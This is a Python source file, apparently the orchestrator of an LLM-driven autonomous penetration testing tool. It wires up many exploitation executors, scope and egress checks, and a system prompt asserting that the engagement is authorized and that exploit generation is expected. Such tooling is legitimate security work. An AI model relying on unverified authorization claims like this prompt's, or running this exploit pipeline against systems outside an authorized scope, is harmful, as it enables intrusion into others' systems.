
import json
import logging
import asyncio
import re
from enum import Enum
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional, Any, List
from dataclasses import dataclass, field

@dataclass
class PhaseConfig:
    MAX_CONSECUTIVE_FAILURES: int = 2
    TIMEOUT_MINUTES: int = 10
    MAX_ITERATIONS: int = 20

@dataclass
class PhaseState:
    phase_name: str
    start_time: datetime = field(default_factory=datetime.now)
    iterations: int = 0
    failure_count: int = 0
    consecutive_failures: int = 0
    objective_met: bool = False


from agents.llm_client import LLMClient, TaskTier
from agents.authorization import AuthorizationManager
from core.memory.shared_context import SharedContextV2 as SharedContext
from core.tools.tool_registry import ToolRegistry
from core.orchestration.agent_spawner import AgentSpawner
from core.exploitation.chain_integration import ChainManager
from core.exploitation.post_exploit import PostExploitManager
from core.reporting import EnterpriseReporter
from core.reporting.metrics import MetricsTracker
from core.orchestration.automation import AutomationEngine
from core.security.consent import get_consent
from core.exploitation.request_capture import RequestCapturer
from core.validation import gate as confidence_gate, DedupStore
from core.compliance import ComplianceReporter, available_frameworks

from core.knowledge.persistent_store import KnowledgeStore as PersistentKnowledgeStore
import os
import uuid

from core.memory.stores import KnowledgeStore, EvidenceStore, FindingStore
from core.orchestration.task_manager import TaskManager
from core.orchestration.legacy_scheduler import Scheduler
from core.memory.context_resolver import ContextResolver

from core.tools.tool_invocation_engine import ToolInvocationEngine
from core.orchestration.execution_mode import get_execution_config
from core.tools.tool_gateway import ToolGateway
from core.orchestration.claude_agent_loop import ClaudeAgentLoop
from core.orchestration.agentic_executor import AgenticExecutor

from core.common.schemas import (
    BrainDecision, BrainDecisionAction, ExecutionState, TaskSpec,
    SuccessCriterion, SuccessCriterionType, CapabilityType
)

from core.intelligence.osint_integration import OSINTOrchestrator
from core.intelligence.target_profiler import TargetProfiler
from core.tools.tool_effectiveness import ToolEffectivenessEngine
from core.exploitation.api_reconstructor import APIReconstructor
from core.exploitation.poc_generator import POCGenerator

from core.coverage.coverage_engine import CoverageEngine
from core.coverage.catalog import SecurityTestCatalog
from core.hypothesis import HypothesisGenerator
from core.convergence import ConvergenceEngine, CompletionValidator
from core.learning import ExperienceLearner
from core.decisions import DecisionGuardV2
from core.scheduling.experiment_scheduler import ExperimentScheduler
# Replaced by execution_pipeline_v2
from core.adaptation.generic_site_adapter import GenericSiteAdapter
from core.checkpointing.secure_checkpoint import SecureCheckpoint
from core.security.secret_manager import SecretManager
from core.security.execution_auditor import ExecutionAuditor
from core.validation.contract_validator import ContractValidator
from core.attack_surface.graph import AttackSurfaceGraph
from core.identity.credential_store import CredentialStore
from core.identity.identity_manager import IdentityManager
from core.identity.session_manager import SessionManager as IdentitySessionManager
from core.extraction.endpoint_extractor import EndpointExtractor
from core.replay.replay_engine import ReplayEngine
from core.replay.session_manager import SessionManager as ReplaySessionManager
from core.replay.identity_store import IdentityStore
from core.replay.http_proxy import HttpProxy
from core.fuzzing.fuzzer_orchestrator import FuzzerOrchestrator
from core.injection.injection_matrix import InjectionMatrix
from core.access_control.matrix_engine import MatrixEngine

# P0 — Foundation
from core.security.security_context import SecurityContext as SecurityContextV2
from core.security.capability_registry import CapabilityRegistry, CapabilityDefinition
from core.security.authorization_service import AuthorizationService, AuthorizationPolicy
from core.reasoning.reasoning_engine import ReasoningEngine

# P1a — Experiment Model
from core.domain.experiment import SecurityExperiment
from core.scheduling.experiment_scheduler import ExperimentScheduler as ExperimentSchedulerV2
from core.scheduling.duplicate_detector import DuplicateDetector

# P1b — Deterministic Executors
from core.execution.executors.authentication import AuthenticationExecutor
from core.execution.executors.authorization import AuthorizationExecutor
from core.execution.executors.sql_injection import SQLiExecutor
from core.execution.executors.xss import XSSExecutor
from core.execution.executors.generic import (
    CORSExecutor, InfoDisclosureExecutor, GraphQLExecutor,
    WebSocketExecutor, BusinessLogicExecutor, PathTraversalExecutor,
    JWTExecutor, NoSQLiExecutor, FileUploadExecutor,
    PrototypePollutionExecutor, SSRFExecutor, XXEExecutor,
    CSRFExecutor, IDORExecutor, MassAssignmentExecutor,
    # Tier 1
    SSTIExecutor, CommandInjectionExecutor, OpenRedirectExecutor,
    OAuthMisconfigExecutor, CAPTCHABypassExecutor, PasswordPolicyExecutor,
    RateLimitExecutor, LogInjectionExecutor, BackupFileScannerExecutor,
    # Tier 2
    AdvancedSQLiExecutor, AdvancedXSSExecutor,
    AdvancedJWTExecutor, AdvancedFileUploadExecutor,
    # Tier 3
    SCAExecutor, TyposquatDetector, WAFEvasionDetector,
    # Tier 4
    SecurityQuestionSolverExecutor, LLMPasswordDerivationExecutor,
    LLMBusinessLogicExplorerExecutor,
    # Tier 5
    MFABypassExecutor, CryptoWeaknessDetector, LLMContentAnalyzerExecutor,
    # Tier 6 — best-effort at the "unreachable" ceiling
    SteganographyDetector, SubtitleXSSExecutor, NestedEncodingSolver,
    BlockchainWeb3Detector, RaceConditionExploiter, HiddenResourceEnumerator,
    GDPRAbuseDetector, ErrorMessageLeakDetector, EncodingMisconfigDetector,
    # Tier 7 — remaining coverage gaps
    HTTPRequestSmugglingExecutor, InsecureDeserializationDetector,
    CloudBucketEnumerator, SubdomainTakeoverDetector, LDAPInjectionExecutor,
    CSPBypassDetector, WebCachePoisoningExecutor, DOMXSSStaticAnalyzer,
    SAMLFlawDetector, PromptInjectionTester, CICDExposureScanner,
    BasicAuthBypassExecutor, HeaderRateLimitBypassExecutor,
    # Tier 8 — credentialed + browser-runtime
    AWSCredentialedEnumerator, AzureCredentialedEnumerator,
    GCPCredentialedEnumerator, KubernetesRBACExecutor,
    CIPipelineSecretExtractor,
    LiveDOMXSSExecutor, LivePostMessageAbuseDetector,
    LiveClickjackingDetector, LiveCSPBypassAttempt,
)
from core.execution.executors.differential_research import (
    DifferentialResearchExecutor, MetamorphicConsistencyExecutor,
    InvariantOracleExecutor,
)

# P1c — Evidence / Oracle / Finding
from core.evidence.validator import EvidenceValidator
from core.findings.finding_state_machine import FindingStateMachine
from core.findings.finding_store import FindingStore as FindingStoreV2

# P2 — Coverage
from core.coverage.security_test_catalog import build_default_catalog
from core.coverage.applicability_engine import ApplicabilityEngine
from core.coverage.coverage_matrix import CoverageMatrix, CoverageState
from core.coverage.convergence_engine import ConvergenceEngine as ConvergenceEngineV2
from core.attack_surface.endpoint_inventory import EndpointInventoryV2

# P3 — Integration + Reporting
from core.execution.execution_pipeline import ExecutionPipelineV2
from core.reasoning.hypothesis_engine import HypothesisEngine
from core.knowledge.knowledge_graph import KnowledgeGraph
from core.reporting.coverage_report import CoverageReport
from core.failure.failure_taxonomy import FailureClassifier
from core.recovery.recovery_policy import RecoveryPolicy, RetryAction

# P4-P8 — Canonical pipeline modules
from core.coverage.payload_catalog import build_default_payload_catalog
from core.coverage.hypothesis_engine import HypothesisEngine as HypothesisEngineV2
from core.coverage.identity_coverage import IdentityCoverageEngine
from core.coverage.feedback_loop import FeedbackLoopEngine
from core.orchestration.parallel_executor import ParallelExecutor
from core.orchestration.target_health_manager import TargetHealthManager
from core.learning.structured_learning import StructuredLearningEngine
from core.exploitation.exploit_chain import POCGate
from core.reporting.canonical_reporter import CanonicalReporter
from core.validation.tool_argument_validator import ToolArgumentValidator
from core.attack_surface.spa_detector import SPADetector

# ── Phase 2-10 hardening components ──
from core.security.authorization_authority import AuthorizationAuthority, AuthorizationScope
from core.security.connection_pinning import ConnectionPinning, EgressTelemetry
from core.intelligence.application_model import ApplicationModel
from core.knowledge.semantic_inference import SemanticInferenceEngine
from core.identity.session_model import IdentityManager as SessionIdentityManager
from core.identity.authorization_matrix import AuthorizationMatrix, AccessTester
from core.workflows.state_machine import WorkflowStateMachine
from core.workflows.concurrency_engine import ConcurrencyEngine
from core.coverage.hypothesis_ledger import HypothesisLedger
from core.reasoning.typed_planner import TypedActionPlanner
from core.evidence.evidence_graph import EvidenceGraph
from core.evidence.oracle import get_oracle_engine
from core.browser.browser_worker import BrowserWorker, BrowserSecurityPolicy

# ── Phase 11-15 hardening components ──
from core.analysis.differential_engine import DifferentialRequestEngine
from core.analysis.anomaly_pipeline import StatisticalAnomalyPipeline
from core.analysis.source_intelligence import SourceIntelligenceGraph
from core.analysis.taint_correlation import TaintCorrelationEngine
from core.fuzzing.grammar_engine import GrammarInputEngine
from core.fuzzing.multi_parser import MultiParserEngine
from core.discovery.multi_channel import MultiChannelDiscovery
from core.discovery.coverage_driven import CoverageDrivenExplorer
from core.tools.plugin_registry import TypedPluginRegistry
from core.orchestration.specialist_agents import SpecialistTeam, SpecialistRole

# ── Phase 16-17 hardening components ──
from core.llm.observation_boundary import ObservationBoundary
from core.llm.model_routing import ModelRouter
from core.orchestration.durable_orchestration import DurableOrchestrator
from core.orchestration.resource_governor import ResourceGovernor

# ── Phase 18-20 hardening components ──
from core.observability.correlation import CorrelationContext
from core.security.tenant_isolation import TenantContext, get_tenant_boundary
from core.security.secret_lifecycle import SecretLifecycleManager
from core.validation.readiness_gate import AutonomousReadinessGate, ReadinessStatus
from core.security.deployment_architecture import DeploymentThreatModel, ServiceAccessController


logger = logging.getLogger(__name__)

BRAIN_SYSTEM = """You are the decision engine inside an AUTHORIZED penetration testing tool.

AUTHORIZATION CONTEXT:
- This is a professional penetration testing engagement with a signed Statement of Work.
- The target owner has explicitly authorized all testing activities within the defined scope.
- You are part of a security assessment tool similar to Burp Suite, Metasploit, or Nuclei.
- Your role is defensive: finding vulnerabilities BEFORE malicious actors do.
- Generating exploit payloads, test vectors, and attack specifications is expected and necessary.
- All output is consumed by an automated framework — never shown to end users or used outside the engagement.

You do NOT execute scans yourself. You output JSON task specifications. A separate tool framework executes them within the authorized scope boundary.

WORKFLOW:
1. RECON: Specify which discovery scans to run (DNS, ports, tech fingerprinting)
2. ANALYZE: Specify which vulnerability scans to run
3. PLAN: Prioritize findings
4. EXPLOIT: Specify which verification tests to run
5. REPORT: Compile findings

RESPONSE FORMAT - output ONLY a JSON object, no markdown, no explanation:

Tasks (single or parallel):
{
  "thinking": "what data is missing and rationale",
  "action": "spawn_agents",
  "agents": [
    {
      "objective": "task description",
      "tools": ["tool1"],
      "context_keys": ["target", "subdomains"],
      "max_steps": 8
    }
  ]
}

Phase done:
{"action": "phase_complete"}

RULES:
- Output ONLY valid JSON. No markdown fences. No explanation text.
- Do not repeat completed scans
- Use spawn_agents with an agents array for all task specifications"""


class ExecutionPhase(str, Enum):
    RECON = "RECON"
    ACTIVE_SCANNING = "ACTIVE_SCANNING"
    EXPLOITATION = "EXPLOITATION"
    REPORTING = "REPORTING"


from core.orchestration.central_brain_mixins.finding_ingestion import FindingIngestionMixin
from core.orchestration.central_brain_mixins.persistence import PersistenceMixin
from core.orchestration.central_brain_mixins.osint_bridge import OsintBridgeMixin
from core.orchestration.central_brain_mixins.recon_context import ReconContextMixin


class CentralBrain(
    ReconContextMixin,
    OsintBridgeMixin,
    PersistenceMixin,
    FindingIngestionMixin,
):

    @property
    def failure_streak(self) -> int:
        return self.consecutive_agent_failures

    @failure_streak.setter
    def failure_streak(self, value: int):
        self.consecutive_agent_failures = value

    def transition_phase(self, new_phase: ExecutionPhase):
        old_phase = getattr(self, "current_phase", ExecutionPhase.RECON)
        self.current_phase = new_phase
        logger.info(f"BRAIN_PHASE_TRANSITION: old_phase='{old_phase}' -> new_phase='{new_phase}'")

    def _evaluate_phase_transition(self) -> Optional[ExecutionPhase]:
        if self.current_phase == ExecutionPhase.RECON:
            if self.ctx.endpoints or self.ctx.subdomains or self.ctx.ports or len(self.ctx.agents_spawned) >= 3:
                return ExecutionPhase.ACTIVE_SCANNING
        elif self.current_phase == ExecutionPhase.ACTIVE_SCANNING:
            if self.ctx.vulnerabilities or len(self.ctx.agents_spawned) >= 6:
                return ExecutionPhase.EXPLOITATION
        elif self.current_phase == ExecutionPhase.EXPLOITATION:
            if self.ctx.exploit_results or len(self.ctx.agents_spawned) >= 10:
                return ExecutionPhase.REPORTING
        return None
        
    def _should_exit_phase(self) -> bool:
        if not hasattr(self, 'phase_state') or not hasattr(self, 'phase_config'):
            return False
            
        state = self.phase_state
        config = self.phase_config
        
        if (datetime.now() - state.start_time).total_seconds() > (config.TIMEOUT_MINUTES * 60):
            logger.warning(f"Phase {state.phase_name} timed out.")
            return True
        if state.iterations >= config.MAX_ITERATIONS:
            logger.warning(f"Phase {state.phase_name} reached max iterations.")
            return True
        if state.consecutive_failures >= config.MAX_CONSECUTIVE_FAILURES:
            logger.warning(f"Phase {state.phase_name} reached consecutive failure threshold.")
            return True
        if state.objective_met:
            logger.info(f"Phase {state.phase_name} objective met.")
            return True
            
        return False
        
    def request_stop(self):
        self._stop_requested = True
        self._stop_file.parent.mkdir(parents=True, exist_ok=True)
        self._stop_file.touch()
        logger.info("STOP_REQUESTED: Will stop after current phase completes")

    def _check_stop_signal(self) -> bool:
        if self._stop_requested:
            return True
        if self._stop_file.exists():
            self._stop_requested = True
            try:
                self._stop_file.unlink()
            except Exception:
                pass
            logger.info("STOP_SIGNAL_DETECTED: Stop file found, will stop after current phase")
            return True
        return False

    def _clean_stop_signal(self):
        try:
            if self._stop_file.exists():
                self._stop_file.unlink()
        except Exception:
            pass

    def _write_progress(self, extra: dict = None):
        try:
            progress = {
                "target": self.ctx.target,
                "phase": self.current_phase.value if self.current_phase else "COMPLETE",
                "elapsed_seconds": (datetime.now() - self.start_time).total_seconds(),
                "agents_spawned": len(self.ctx.agents_spawned),
                "subdomains": len(getattr(self.ctx, "subdomains", []) or []),
                "endpoints": len(getattr(self.ctx, "endpoints", []) or []),
                "vulnerabilities": len(self.ctx.vulnerabilities),
                "exploits": len(self.ctx.exploit_results),
                "timestamp": datetime.now().isoformat(),
            }
            if extra:
                progress.update(extra)
            try:
                from core.database.pg_store import LiveDataRepo
                LiveDataRepo.upsert_progress(self._scan_id, progress)
            except Exception:
                pass
        except Exception:
            pass
        self._write_live_results()

    def _transition_to_next_phase(self):
        # P1-9: report REAL coverage (executed vs applicable), not the
        # theoretical applicable-cell headline, at each transition.
        try:
            cm = getattr(self, "coverage_matrix", None)
            if cm is not None and hasattr(cm, "coverage_summary"):
                cs = cm.coverage_summary()
                logger.info(
                    f"COVERAGE_REAL: applicable={cs['applicable']} "
                    f"executed={cs['executed']} ({cs['pct_executed']*100:.1f}%) "
                    f"resolved={cs['resolved']} not_tested={cs['not_tested']} "
                    f"blocked={cs['blocked']}")
        except Exception as _e:
            logger.debug(f"coverage summary skipped: {_e}")

        # P2-2: emit hypothesis-engine summary at every transition so we
        # can see whether the LLM's next-best-action is being pursued.
        try:
            from core.hypothesis.hypothesis_engine import get_engine
            eng = get_engine()
            summary = eng.summary()
            if summary:
                logger.info(f"HYPOTHESIS_SUMMARY: {summary}")
            nba = eng.next_best_action()
            if nba:
                logger.info(f"HYPOTHESIS_NBA: vuln_class={nba.vuln_class} "
                            f"endpoint={nba.endpoint} score={nba.score():.2f}")
        except Exception as _e:
            logger.debug(f"hypothesis summary skipped: {_e}")

        # P0-4: prefer the dependency-aware scheduler when we have enough
        # context. Fall back to the legacy state-machine only if the DAG
        # can't produce a next phase (typically because prereqs aren't met
        # yet — in that case we terminate the loop, same as before).
        try:
            from core.orchestration.phase_dag import PhaseScheduler, default_dag
            # Authoritative completed set (P0-4). Union the explicit set with any
            # phase_history entries that DO expose a name, for resume safety.
            completed = set(getattr(self, "_completed_phases", set()) or set())
            for p in getattr(self, "phase_history", []) or []:
                nm = getattr(p, "value", None) or getattr(p, "phase_name", None)
                if nm:
                    completed.add(nm if isinstance(nm, str) else getattr(nm, "value", str(nm)))
            if getattr(self, "current_phase", None):
                completed.add(self.current_phase.value)
            # P0.6: controlled re-entry — a completed phase may be re-run ONLY
            # when a genuine dependency event (new host/endpoint/finding/auth
            # context) appeared since the last transition, and only within a
            # per-phase budget. Absent events this is a no-op (forward-only).
            try:
                from core.orchestration.phase_reentry import (
                    PhaseReentryController, snapshot_ctx)
                if not hasattr(self, "_reentry"):
                    self._reentry = PhaseReentryController()
                    self._phase_snapshot = {}
                cur_snap = snapshot_ctx(self.ctx)
                self._reentry.detect(self._phase_snapshot or cur_snap, cur_snap)
                self._phase_snapshot = cur_snap
                before = set(completed)
                completed = self._reentry.consume_reentries(completed)
                reopened = before - completed
                if reopened:
                    logger.info(f"PHASE_REENTRY: re-opening {sorted(reopened)} on "
                                "dependency event(s)")
            except Exception as _re:
                logger.debug(f"phase re-entry check skipped: {_re}")
            allowed = set(self._allowed_phases) if self._allowed_phases else None
            sched = PhaseScheduler(default_dag(), allowed=allowed)
            nxt = sched.next_ready(self.ctx, completed)
            if nxt:
                self.transition_phase(ExecutionPhase(nxt))
                return
            reasons = sched.blocked_reasons(self.ctx, completed)
            if reasons:
                logger.info(f"PHASE_DAG_BLOCKED: {reasons}")
            self.current_phase = None
            return
        except Exception as _e:
            logger.debug(f"PhaseScheduler fell back to legacy transition: {_e}")

        next_phase = self._evaluate_phase_transition()
        if next_phase:
            if self._allowed_phases and next_phase.value not in self._allowed_phases:
                further = self._skip_to_next_allowed(next_phase)
                if further:
                    self.transition_phase(further)
                else:
                    self.current_phase = None
            else:
                self.transition_phase(next_phase)
        else:
            self.current_phase = None

    def _skip_to_next_allowed(self, from_phase: ExecutionPhase) -> Optional[ExecutionPhase]:
        order = [ExecutionPhase.RECON, ExecutionPhase.ACTIVE_SCANNING,
                 ExecutionPhase.EXPLOITATION, ExecutionPhase.REPORTING]
        start = order.index(from_phase) if from_phase in order else len(order)
        for p in order[start:]:
            if p.value in (self._allowed_phases or set()):
                return p
        return None

    def __init__(self, target: str, scope: Dict = None, resume_checkpoint: str = None,
                 scan_id: str = None):
        from core.memory.dedup_tracker import DeduplicationTracker
        from core.orchestration.checkpointer import Checkpointer

        self._stop_requested = False
        self._stop_file = Path(f".antigravity/stop_{target.replace('://', '_').replace('/', '_')}.signal")

        self.llm = LLMClient.get()
        self.ctx = SharedContext(target, scope)
        self.checkpointer = Checkpointer()
        self.tools = ToolRegistry()
        self.spawner = AgentSpawner(self.tools, self.ctx)
        self.auth = AuthorizationManager(scope=scope)
        self.dedup = DeduplicationTracker()
        self.start_time = datetime.now()
        # Canonical run id: use the one the UI passed, else generate a globally-unique
        # one. Every DB row for this run is keyed by it, so two runs of the same URL
        # (even seconds apart) never collide or merge.
        from core.database.pg_store import make_run_id as _make_run_id
        self._scan_id = scan_id or _make_run_id(target)
        self.ctx.scan_id = self._scan_id

        from core.reporting.agent_activity import get_activity_log
        self._activity = get_activity_log()

        self.max_agents_per_phase = 15
        # reports/ is opt-in via REPORTS_ENABLED (default off). See
        # core/common/reports_config.py. When disabled, `report_dir` points
        # at a temp path so downstream writers can no-op harmlessly.
        from core.common.reports_config import reports_enabled, reports_dir
        if reports_enabled():
            self.report_dir = reports_dir()
            self.report_dir.mkdir(parents=True, exist_ok=True)
        else:
            import tempfile
            self.report_dir = Path(tempfile.gettempdir()) / "antigravity_disabled_reports"
            # Do not create — writers that need reports must gate on reports_enabled().
        self.failed_tools = set()  # NEW: Brain-level tool failure tracking
        self.current_phase = ExecutionPhase.RECON
        self.phase_config = PhaseConfig()
        self.phase_history = []
        # P0-4: authoritative set of phase VALUES already run. phase_history
        # holds PhaseState objects (no `.value`), so deriving "completed" from
        # it silently yielded an empty set — letting the DAG re-enter RECON
        # forever (RECON has no deps). This set makes the DAG truly forward-only.
        self._completed_phases: set = set()
        
        from core.security.compliance_gate import ComplianceGate, ScopeValidator, ComplianceAuditLogger
        scope_val = ScopeValidator(authorized_targets=scope.get("domains") or [target] if scope else [target])
        self.compliance_gate = ComplianceGate(scope_validator=scope_val, audit_logger=ComplianceAuditLogger())

        self.chain_mgr = ChainManager(self.ctx, self.spawner)  # Phase 2: Chain system
        self.tier = (self.ctx.scope.get("max_tier") or "POC").upper()
        self.post_exploit = None  # Phase 3: Post-exploitation (lazy, needs foothold)
        # Phase 4: enterprise hardening / automation
        self.metrics = MetricsTracker(target=target, out_dir=str(self.report_dir))
        self.automation = AutomationEngine(self.ctx)
        self.reporter = EnterpriseReporter(self.ctx, report_dir=str(self.report_dir))
        self.osint_orchestrator = OSINTOrchestrator(self.ctx)
        self.threat_engine = self.osint_orchestrator.threat_engine
        self.subdomain_engine = self.osint_orchestrator.subdomain_engine

        # HexStrike Intelligence Layer
        self.target_profile = None  # Populated in run() after tool validation
        
        
        # Accept KNOWLEDGE_DB_PATH (canonical) with legacy KNOWLEDGE_DB fallback.
        db_path = os.getenv("KNOWLEDGE_DB_PATH") \
                  or os.getenv("KNOWLEDGE_DB") \
                  or str(self.report_dir / "findings.db")
        self.persistent_knowledge_store = PersistentKnowledgeStore(db_path)
        self.target_id = f"tgt_{uuid.uuid4().hex[:12]}"
        self.persistent_knowledge_store.add_target(
            self.target_id,           # arg 1: ID
            target,                   # arg 2: URL
            "url"                     # arg 3: type
        )
        logger.info(f"Knowledge store initialized: {db_path}")

        # Core state and compatibility attributes
        self.target = target
        self.scope = scope or {}
        
        # Initialize target scope validation and wire the unified façade so
        # every executor consults the same authority. This closes the "three
        # disjoint singletons" gap (#082/#083).
        from core.security.authorization import TargetScopeValidator
        from core.security.scope_facade import get_scope_authority
        auth_targets = self.scope.get("domains") or self.scope.get("authorized_targets") or [target]
        tsv = TargetScopeValidator(auth_targets)
        TargetScopeValidator.set(tsv)

        _authority = get_scope_authority()
        _authority.wire_target_scope_validator(tsv)
        # Seed the façade's own allowlist so it can enforce even before the
        # ScopeManager / LegalValidator are wired.
        for _t in auth_targets:
            _authority.add_domain(_t)

        self.authorized_scope = auth_targets
        self.execution_count = 0
        self.max_iterations = 100

        # Memory stores (for compatibility with OrchestratorV2 and state validation)
        self.knowledge_store = KnowledgeStore()
        self.evidence_store = EvidenceStore()
        self.finding_store = FindingStore()

        # Framework components
        
        # Phase 3 Configuration
        self.execution_config = get_execution_config()
        from core.security.audit_logger import AuditLogger
        from core.tools.tool_cache import ToolResultCache
        self.audit_logger = AuditLogger()
        self.tool_cache = ToolResultCache()
        # Use existing registry and stores for the gateway
        self.tool_gateway = ToolGateway(self.tools, self.tool_cache, self.audit_logger)
        self.tool_invocation_engine = ToolInvocationEngine(self.tool_gateway)
        logger.info(f"Hybrid Mode Initialized: {self.execution_config.mode.name}")

        self.task_manager = TaskManager()
        self.scheduler = Scheduler(self.task_manager)
        self.context_resolver = ContextResolver(self.knowledge_store)

        # AntiGravity v2.0 modules
        self.security_catalog = SecurityTestCatalog()
        self.coverage_engine = CoverageEngine(self.security_catalog)
        self.hypothesis_ranker = None  # initialized lazily when LLMRouter available
        self.convergence_engine = ConvergenceEngine(self.coverage_engine)
        self.completion_validator = CompletionValidator(self.coverage_engine, self.convergence_engine)
        self.experience_learner = ExperienceLearner()
        # Closed-loop reward policy — persistent self-improvement across runs.
        try:
            from core.learning.reward_policy import get_reward_policy
            self.reward_policy = get_reward_policy()
            _rp_stats = self.reward_policy.stats()
            if _rp_stats.get("total_pulls"):
                logger.info(f"[RewardPolicy] warm start: {_rp_stats['strategies_tracked']} strategies, "
                            f"{_rp_stats['total_pulls']} prior outcomes")
        except Exception as _e:
            self.reward_policy = None
            logger.debug(f"[RewardPolicy] init skipped: {_e}")
        self.decision_guard = DecisionGuardV2(
            self.coverage_engine, self.experience_learner,
            available_tools=list(self.tools.tools.keys()) if hasattr(self.tools, 'tools') else None,
        )
        # Let the decision guard consult reward scores when picking alternatives.
        if self.reward_policy is not None:
            try:
                self.decision_guard.reward_policy = self.reward_policy
            except Exception:
                pass
        self.experiment_scheduler = ExperimentScheduler()
        # execution_pipeline replaced by self.pipeline_v2 (initialized in P3 block below)
        self.execution_auditor = ExecutionAuditor()
        self.secure_checkpoint = SecureCheckpoint()
        self.secret_manager = SecretManager()

        # Attack Surface Graph
        self.attack_surface = AttackSurfaceGraph()
        self.hypothesis_generator = HypothesisGenerator(self.coverage_engine, self.attack_surface)

        # Identity & Session Management
        self.credential_store = CredentialStore()
        self.identity_manager = IdentityManager(self.credential_store, shared_context=self.ctx)
        self.identity_session_manager = IdentitySessionManager(shared_context=self.ctx)

        # Endpoint Extraction
        self.endpoint_extractor = EndpointExtractor()

        # Request-Response Replay
        self.identity_store = IdentityStore()
        self.replay_session_manager = ReplaySessionManager(self.identity_store)
        self.http_proxy = HttpProxy(verify_ssl=False)
        self.replay_engine = ReplayEngine(self.replay_session_manager, self.http_proxy)

        # Fuzzer Orchestration
        self.fuzzer_orchestrator = FuzzerOrchestrator(target)

        # Injection Matrix
        self.injection_matrix = InjectionMatrix()

        # Access Control Matrix Engine
        self.access_control_engine = MatrixEngine(
            replayer=self.replay_engine,
            identities=self.identity_manager.identities,
            shared_context=self.ctx,
        )

        # Contract validation at startup
        try:
            ContractValidator.validate_startup()
            logger.info("[ContractValidator] Domain model contracts validated")
        except Exception as e:
            logger.warning(f"[ContractValidator] Validation warning: {e}")

        # ── P0: Foundation Layer ──
        self.security_context_v2 = SecurityContextV2(
            target=target,
            scope=[f"*.{target}", target],
        )
        self.capability_registry = CapabilityRegistry()
        self.authorization_service = AuthorizationService()
        self.authorization_service.register_policy(AuthorizationPolicy(
            target=target,
            allowed_identities=["admin", "tester", "scanner"],
            allowed_actions=["scan", "fuzz", "enumerate", "exploit"],
            blocked_patterns=[],
        ))
        self.reasoning_engine = ReasoningEngine(llm_client=None)

        # ── Phase 2.1: Unified Authorization Authority ──
        self.auth_authority = AuthorizationAuthority.get()
        _default_scope = AuthorizationScope(hosts=set(auth_targets), lab_mode=bool(self.scope.get("lab_mode")))
        self.auth_authority.register_scope("default", _default_scope)

        # ── Phase 3.2: Connection Pinning & Egress Telemetry ──
        self.connection_pinning = ConnectionPinning.get()
        self.egress_telemetry = EgressTelemetry.get()

        # ── Phase 5.1/5.2: Hardened Browser Worker ──
        def _browser_egress_check(url: str) -> bool:
            try:
                from core.security.egress_firewall import assert_egress_allowed
                assert_egress_allowed(url, purpose="browser")
                return True
            except Exception:
                return False
        self.browser_worker = BrowserWorker(
            policy=BrowserSecurityPolicy(),
            egress_checker=_browser_egress_check,
        )

        # ── Phase 6.1: Application Knowledge Graph ──
        self.application_model = ApplicationModel()

        # ── Phase 6.2: Semantic Inference Engine ──
        self.semantic_inference = SemanticInferenceEngine()

        # ── Phase 1.5: LLM semantic app understanding (business-domain layer) ──
        from core.intelligence.app_understanding import AppUnderstandingEngine
        self.app_understanding = AppUnderstandingEngine()

        # ── Phase 7.1: Identity/Session Model (vault-backed) ──
        self.session_identity_manager = SessionIdentityManager()

        # ── Phase 7.2: Authorization Matrix ──
        self.authorization_matrix = AuthorizationMatrix(self.session_identity_manager)
        self.access_tester = AccessTester(self.authorization_matrix)

        # ── Phase 8.1: Workflow State Machine ──
        # Created per-workflow; factory stored here
        self.workflow_factory = WorkflowStateMachine

        # ── Phase 8.2: Concurrency/Race Engine ──
        self.concurrency_engine = ConcurrencyEngine()

        # ── Phase 9.1: Hypothesis Ledger ──
        self.hypothesis_ledger = HypothesisLedger()

        # ── Phase 9.2: Typed Action Planner ──
        self.typed_planner = TypedActionPlanner(
            ledger=self.hypothesis_ledger,
            policy_engine=True,
        )

        # ── Phase 10.1: Evidence Graph ──
        self.evidence_graph = EvidenceGraph()

        # ── Phase 10.2: Oracle Engine ──
        self.oracle_engine = get_oracle_engine()

        # ── Phase 11.1: Differential Request/Response Engine ──
        self.differential_engine = DifferentialRequestEngine()

        # ── Phase 11.2: Statistical Anomaly Pipeline ──
        self.anomaly_pipeline = StatisticalAnomalyPipeline()

        # ── Phase 12.1: Source Intelligence Graph ──
        self.source_intelligence = SourceIntelligenceGraph()

        # ── Phase 12.2: Taint Correlation Engine ──
        self.taint_correlation = TaintCorrelationEngine()

        # ── Phase 13.1: Grammar-Aware Input Engine ──
        self.grammar_engine = GrammarInputEngine()

        # ── Phase 13.2: Multi-Parser Engine ──
        self.multi_parser = MultiParserEngine()

        # ── Phase 14.1: Multi-Channel Discovery ──
        def _discovery_scope_check(url: str) -> bool:
            try:
                from urllib.parse import urlparse
                host = (urlparse(url).hostname or "").lower()
                normalized_targets = {
                    (urlparse(t).hostname or t).lower() for t in auth_targets
                }
                return host in normalized_targets or any(
                    host.endswith(f".{t}") for t in normalized_targets
                )
            except Exception:
                return False
        self.multi_channel_discovery = MultiChannelDiscovery(scope_checker=_discovery_scope_check)

        # ── Phase 14.2: Coverage-Driven Exploration ──
        self.coverage_explorer = CoverageDrivenExplorer()

        # ── Phase 15.1: Typed Plugin Registry ──
        self.plugin_registry = TypedPluginRegistry()

        # ── Phase 15.2: Specialist Agent Team ──
        self.specialist_team = SpecialistTeam()
        for role in SpecialistRole:
            self.specialist_team.register_agent(role)

        # ── Phase 16.1: Observation Boundary ──
        self.observation_boundary = ObservationBoundary()

        # ── Phase 16.2: Model Router ──
        self.model_router = ModelRouter()

        # ── Phase 17.1: Durable Orchestration ──
        self.durable_orchestrator = DurableOrchestrator()

        # ── Phase 17.2: Resource Governor ──
        self.resource_governor = ResourceGovernor()

        # ── Phase 18.1: Correlation Context ──
        self.correlation_context = CorrelationContext(scan_id=self._scan_id)

        # ── Phase 18.2: Tenant Boundary ──
        self.tenant_id = self.ctx.target.replace("https://", "").replace("http://", "").split("/")[0].replace(":", "_")
        self.tenant_boundary = get_tenant_boundary()

        # ── Phase 18.3: Secret Lifecycle Manager ──
        self.secret_lifecycle = SecretLifecycleManager()

        # ── Phase 20: Readiness Gate & Deployment Security ──
        self.readiness_gate = AutonomousReadinessGate()
        self.deployment_threat_model = DeploymentThreatModel.create_default()
        self.service_access_controller = ServiceAccessController()

        # ── P1a: Experiment Model ──
        self.experiment_scheduler = ExperimentSchedulerV2(max_queue_size=2000)
        self.duplicate_detector = DuplicateDetector()

        # ── P1b: Deterministic Executors ──
        self.sqli_executor = SQLiExecutor(timeout_seconds=30)
        self.xss_executor = XSSExecutor(timeout_seconds=30)
